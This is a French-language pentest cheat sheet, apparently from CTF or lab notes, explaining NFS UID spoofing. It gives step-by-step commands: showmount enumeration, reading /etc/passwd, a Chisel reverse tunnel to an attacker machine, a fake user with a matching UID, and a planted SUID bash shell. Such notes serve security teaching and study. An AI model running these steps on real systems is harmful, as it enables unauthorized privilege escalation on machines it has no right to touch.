# NFS UID Spoofing

## <mark style="color:red;">🗂️ NFS UID Spoofing — Élévation de privilèges via usurpation d'identité</mark>

### <mark style="color:blue;">Concept</mark>

NFS (Network File System) est un protocole de partage de fichiers réseau. Sa faiblesse fondamentale : il s'appuie **uniquement sur l'UID/GID** pour contrôler les accès, sans vérifier les noms d'utilisateurs ni les mots de passe.

> **Principe d'attaque** : créer localement un utilisateur avec le même UID qu'un utilisateur cible sur le serveur NFS → NFS vous traitera comme cet utilisateur.

***

### <mark style="color:green;">Prérequis</mark>

* Accès à un shell sur une machine pouvant atteindre le serveur NFS
* Un partage NFS monté avec l'option `rw` (lecture/écriture)
* Connaissance des UID/GID des utilisateurs cibles (via `/etc/passwd` sur la cible)

***

### <mark style="color:blue;">Étapes d'exploitation</mark>

#### <mark style="color:green;">1. Découverte du partage NFS</mark>

```bash
showmount -e <IP_CIBLE>
# Exemple :
showmount -e 172.18.0.1
# > /srv/web.fries.htb *
```

L'option `*` signifie que le partage est accessible depuis **n'importe quelle IP** — vulnérabilité critique.

***

#### <mark style="color:green;">2. Identifier les utilisateurs cibles</mark>

Sur la machine compromise, lire `/etc/passwd` pour trouver les UID intéressants :

```bash
cat /etc/passwd | grep -v nologin | grep -v false
# barman:x:117:120:...:/var/lib/barman:/bin/bash
# → UID 117, GID 120
```

***

#### <mark style="color:green;">3. Accéder au partage NFS (tunnel si nécessaire)</mark>

Si le port NFS (2049) n'est pas directement accessible depuis votre machine, utilisez **Chisel** pour créer un tunnel :

**Sur Kali (serveur) :**

```bash
./chisel server -p 8011 --reverse
```

**Sur la cible (client) :**

```bash
./chisel_x86 client <IP_KALI>:8011 R:2049:<IP_NFS>:2049 R:111:<IP_NFS>:111
```

***

#### <mark style="color:green;">4. Créer l'utilisateur usurpé sur Kali</mark>

```bash
# Créer le groupe avec le GID cible
sudo groupadd -g 120 fakegroup

# Créer l'utilisateur avec l'UID cible
sudo useradd -u 117 -g 120 -M -s /bin/bash fakeuser
```

| Option         | Description                       |
| -------------- | --------------------------------- |
| `-u 117`       | UID identique à la cible (barman) |
| `-g 120`       | GID identique à la cible          |
| `-M`           | Pas de répertoire home            |
| `-s /bin/bash` | Shell utilisable                  |

***

#### <mark style="color:green;">5. Monter le partage NFS</mark>

```bash
sudo mount -t nfs -o vers=4,port=2049 localhost:/srv/web.fries.htb /mnt/target
ls -la /mnt/target
```

***

#### <mark style="color:green;">6. Créer un SUID bash via l'identité usurpée</mark>

**Depuis la machine cible (en tant que l'utilisateur initial) :**

```bash
cp /bin/bash /srv/web.fries.htb/shared/shell_orig
```

**Depuis Kali, en tant que `fakeuser` (UID 117) :**

```bash
sudo -u fakeuser cp /mnt/target/shared/shell_orig /mnt/target/shared/shell_priv
sudo -u fakeuser chmod 6777 /mnt/target/shared/shell_priv
```

> NFS voit UID 117 → le fichier appartient à `barman` sur la cible. `chmod 6777` = SUID + SGID + rwx pour tous.

***

#### <mark style="color:green;">7. Exécuter le shell SUID sur la cible</mark>

```bash
cd /srv/web.fries.htb/shared
./shell_priv -p
# -p = preserve privileges (ne pas abandonner le SUID)

whoami          # → barman (euid)
id              # uid=1000(svc) gid=1000(svc) euid=117(barman) egid=120(barman)
```

***

### <mark style="color:green;">Schéma de l'attaque</mark>

```
Kali                          Cible (via NFS)
────────────────────          ────────────────────
fakeuser (UID: 117)  ──────►  barman (UID: 117)
Crée shell_priv               Propriétaire = barman
chmod 6777                    Bit SUID actif

                              svc exécute ./shell_priv -p
                              → euid = barman ✅
```

***
